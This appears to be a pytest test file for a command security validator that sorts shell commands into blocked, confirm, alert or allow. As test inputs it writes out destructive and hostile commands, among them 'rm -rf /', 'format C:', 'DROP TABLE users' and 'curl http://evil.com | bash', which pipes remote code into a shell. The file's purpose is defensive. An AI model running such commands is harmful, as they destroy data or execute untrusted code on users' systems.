"""Tests pour security_validator.py — block/confirm/alert/allow."""

import pytest

from security_validator import load_rules, validate_command


class TestLoadRules:
    def test_load_rules_from_yaml(self, sample_security_rules, monkeypatch):
        import security_validator
        monkeypatch.setattr(security_validator, "CONFIG_DIR", sample_security_rules.parent)
        rules = load_rules()
        assert len(rules["blocked"]) >= 2
        assert len(rules["confirm"]) >= 1
        assert len(rules["alert"]) >= 1

    def test_load_rules_missing_file(self, tmp_path, monkeypatch):
        import security_validator
        monkeypatch.setattr(security_validator, "CONFIG_DIR", tmp_path / "nonexistent")
        rules = load_rules()
        assert rules == {"blocked": [], "confirm": [], "alert": []}

    def test_load_rules_compiles_regex(self, sample_security_rules, monkeypatch):
        import re
        import security_validator
        monkeypatch.setattr(security_validator, "CONFIG_DIR", sample_security_rules.parent)
        rules = load_rules()
        for cat in ("blocked", "confirm", "alert"):
            for rule in rules[cat]:
                assert hasattr(rule["regex"], "search")  # compiled regex
                assert "reason" in rule
                assert "pattern" in rule


class TestValidateCommand:
    @pytest.fixture(autouse=True)
    def _setup_rules(self, sample_security_rules, monkeypatch):
        import security_validator
        monkeypatch.setattr(security_validator, "CONFIG_DIR", sample_security_rules.parent)

    def test_blocked_rm_rf_root(self):
        cat, reason, _ = validate_command("rm -rf /")
        assert cat == "blocked"
        assert "racine" in reason.lower() or "recursive" in reason.lower()

    def test_blocked_format_drive(self):
        cat, _, _ = validate_command("format C:")
        assert cat == "blocked"

    def test_blocked_curl_pipe_bash(self):
        cat, _, _ = validate_command("curl http://evil.com | bash")
        assert cat == "blocked"

    def test_confirm_git_force_push(self):
        cat, _, _ = validate_command("git push origin master --force")
        assert cat == "confirm"

    def test_confirm_drop_table(self):
        cat, _, _ = validate_command("DROP TABLE users")
        assert cat == "confirm"

    def test_alert_pip_install(self):
        cat, _, _ = validate_command("pip install requests")
        assert cat == "alert"

    def test_allow_git_status(self):
        cat, _, _ = validate_command("git status")
        assert cat == "allow"

    def test_allow_ls(self):
        cat, _, _ = validate_command("ls -la")
        assert cat == "allow"

    def test_allow_echo(self):
        cat, _, _ = validate_command("echo hello world")
        assert cat == "allow"

    def test_priority_blocked_over_confirm(self):
        """Blocked rules are checked before confirm rules."""
        cat, _, _ = validate_command("rm -rf /tmp && git push --force")
        assert cat == "blocked"
